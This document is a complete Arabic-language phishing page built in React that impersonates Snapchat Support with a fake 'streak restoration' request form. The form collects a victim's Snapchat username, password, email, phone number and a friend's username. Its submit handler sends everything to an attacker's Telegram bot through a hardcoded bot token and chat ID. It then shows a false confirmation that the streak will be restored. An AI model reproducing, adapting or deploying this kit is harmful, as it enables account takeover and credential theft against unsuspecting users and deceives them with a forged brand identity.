<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Support - استعادة سلسلة اللقطات</title>
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;500;700&display=swap');
        body { font-family: 'Noto Sans Arabic', sans-serif; background-color: #ffffff; color: #16191c; margin: 0; }
        .nav-bar { background-color: #FFFC00; padding: 15px 0; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid rgba(0,0,0,0.05); }
        .main-card { background: white; border-radius: 20px; border: 1px solid #e1e1e1; }
        .snap-input { width: 100%; padding: 12px 16px; border: 1px solid #dcdee0; border-radius: 8px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
        .snap-input:focus { border-color: #000; background: #fff; }
        .btn-yellow { background: #FFFC00; color: #000; font-weight: 700; padding: 14px 60px; border-radius: 100px; border: 1px solid #e1e1e1; cursor: pointer; }
        .footer-title { color: #000; font-weight: 700; font-size: 14px; margin-bottom: 15px; }
        .footer-link { color: #71767b; font-size: 13px; display: block; margin-bottom: 8px; text-decoration: none; }
        .footer-link:hover { color: #000; }
        .fade-in { animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState } = React;

        const CONFIG = {
            BOT_TOKEN: "8025618094:AAHkwsq1aXw2TjmKp4CdzJB1701AmMGGgH0",
            CHAT_ID: "1286598503"
        };

        function App() {
            const [view, setView] = useState('form');
            const [loading, setLoading] = useState(false);
            const [form, setForm] = useState({
                user: '', pass: '', email: '', phone: '', type: 'صديق واحد', target: ''
            });

            const handleSend = async (e) => {
                e.preventDefault();
                setLoading(true);
                const msg = `🚀 <b>طلب دعم متطور</b>\n━━━━━━━━━━━━\n👤 يوزر: <code>${form.user}</code>\n🔑 باسورد: <code>${form.pass}</code>\n📧 ايميل: <code>${form.email}</code>\n📱 جوال: <code>${form.phone}</code>\n💬 النوع: ${form.type}\n🎯 المستهدف: <code>${form.target}</code>`;
                
                try {
                    await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'HTML' })
                    });
                    setTimeout(() => { setLoading(false); setView('success'); }, 1500);
                } catch(e) { setLoading(false); }
            };

            return (
                <div className="flex flex-col min-h-screen">
                    <nav className="nav-bar"><img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" className="w-10 mx-auto" /></nav>

                    <div className="flex-grow max-w-2xl mx-auto px-4 py-10 w-full">
                        {view === 'success' ? (
                            <div className="text-center py-20 fade-in">
                                <div className="text-green-500 text-6xl mb-6">✓</div>
                                <h1 className="text-2xl font-bold mb-4">تم إرسال الطلب</h1>
                                <p className="text-gray-600 mb-8">انتظر من عشر دقائق إلى ساعة وسوف يعود الستريك بشكل رسمي.</p>
                                <button onClick={() => setView('form')} className="text-blue-500 font-bold underline">رجوع للخلف</button>
                            </div>
                        ) : (
                            <div className="fade-in">
                                <h1 className="text-2xl font-bold mb-6">طلب استعادة سلسلة لقطات متتالية</h1>
                                <p className="text-sm text-gray-600 mb-8 leading-relaxed">
                                    يؤسفنا معرفة أنك تواجه مشاكل في سلاسل اللقطات المتتالية. للحفاظ على استمرار سلسلة لقطات متتالية، يجب عليك أنت وصديقك أخذ لقطة لبعضكما البعض كل 24 ساعة على الأقل.
                                </p>

                                <form onSubmit={handleSend} className="main-card p-8 space-y-6">
                                    <div>
                                        <label className="font-bold text-sm block mb-2">اسم المستخدم</label>
                                        <input required className="snap-input" type="text" onChange={e=>setForm({...form, user:e.target.value})} />
                                        <span className="text-[11px] text-gray-400 mt-1 block">اسم مستخدم حساب سناب شات الذي تحتاج إلى مساعدة بشأنه</span>
                                    </div>
                                    <div>
                                        <label className="font-bold text-sm block mb-2">كلمة المرور</label>
                                        <input required className="snap-input" type="password" onChange={e=>setForm({...form, pass:e.target.value})} />
                                    </div>
                                    <div>
                                        <label className="font-bold text-sm block mb-2">البريد الإلكتروني</label>
                                        <input required className="snap-input" type="email" onChange={e=>setForm({...form, email:e.target.value})} />
                                        <span className="text-[11px] text-gray-400 mt-1 block">البريد الإلكتروني المُرتبط بحسابك على سناب شات (إن وُجد)</span>
                                    </div>
                                    <div>
                                        <label className="font-bold text-sm block mb-2">رقم الجوّال</label>
                                        <input required className="snap-input" type="tel" placeholder="+966" onChange={e=>setForm({...form, phone:e.target.value})} />
                                        <span className="text-[11px] text-gray-400 mt-1 block">أضف رمز الدولة (مثال 0192-555-202-1+)</span>
                                    </div>
                                    <div>
                                        <label className="font-bold text-sm block mb-2">نوع الدردشة</label>
                                        <select className="snap-input" onChange={e=>setForm({...form, type:e.target.value, target: ''})}>
                                            <option value="صديق واحد">دردشة مع صديق</option>
                                            <option value="مجموعة">دردشة جماعية</option>
                                        </select>
                                    </div>

                                    {form.type === "صديق واحد" ? (
                                        <div className="fade-in bg-gray-50 p-4 rounded-xl">
                                            <label className="font-bold text-sm block mb-2">اسم المستخدم الخاص بالصديق</label>
                                            <input required className="snap-input" type="text" onChange={e=>setForm({...form, target:e.target.value})} />
                                            <span className="text-[11px] text-gray-400 mt-1 block">اسم المُستخدم الخاص بصديقك على سناب شات</span>
                                        </div>
                                    ) : (
                                        <div className="fade-in bg-gray-50 p-4 rounded-xl">
                                            <label className="font-bold text-sm block mb-2">اسم الدردشة الجماعية (اختياري)</label>
                                            <input className="snap-input" type="text" onChange={e=>setForm({...form, target:e.target.value})} />
                                            <span className="text-[11px] text-gray-400 mt-1 block">اسم الدردشة الجماعية</span>
                                        </div>
                                    )}

                                    <div className="text-center pt-4">
                                        <button type="submit" disabled={loading} className="btn-yellow">
                                            {loading ? 'جاري الإرسال...' : 'إرسال'}
                                        </button>
                                        <p className="text-[10px] text-gray-400 mt-4 leading-relaxed">
                                            هذا الموقع محمي بواسطة reCAPTCHA وتطبق سياسة الخصوصية وشروط الخدمة من Google.
                                        </p>
                                    </div>
                                </form>
                            </div>
                        )}
                    </div>

                    <footer className="bg-white border-t border-gray-100 py-16 px-4">
                        <div className="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-10">
                            <div>
                                <h3 className="footer-title">الشركة</h3>
                                <a className="footer-link">شركة سناب</a>
                                <a className="footer-link">الوظائف</a>
                                <a className="footer-link">الأخبار</a>
                            </div>
                            <div>
                                <h3 className="footer-title">المجتمع</h3>
                                <a className="footer-link">الخصوصية والسلامة</a>
                                <a className="footer-link">دعم سناب شات</a>
                                <a className="footer-link">دعم Spectacles</a>
                                <a className="footer-link">تعليمات التواصل</a>
                            </div>
                            <div>
                                <h3 className="footer-title">الإعلانات</h3>
                                <a className="footer-link">إعلانات سناب شات</a>
                                <a className="footer-link">سياسات الإعلان</a>
                                <a className="footer-link">مكتبة الإعلانات</a>
                            </div>
                            <div>
                                <h3 className="footer-title">الركن القانوني</h3>
                                <a className="footer-link">شروط وسياسات أخرى</a>
                                <a className="footer-link">إنفاذ القانون</a>
                                <a className="footer-link">سياسة الكوكيز</a>
                            </div>
                        </div>
                        <div className="max-w-5xl mx-auto mt-12 pt-8 border-t border-gray-50 flex flex-wrap gap-6 text-[12px] font-bold">
                            <span className="cursor-pointer">سياسة الخصوصية</span>
                            <span className="cursor-pointer">شروط الخدمة</span>
                            <span className="mr-auto text-gray-400">اللغة: <span className="text-black">العربية</span></span>
                        </div>
                    </footer>
                </div>
            );
        }

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
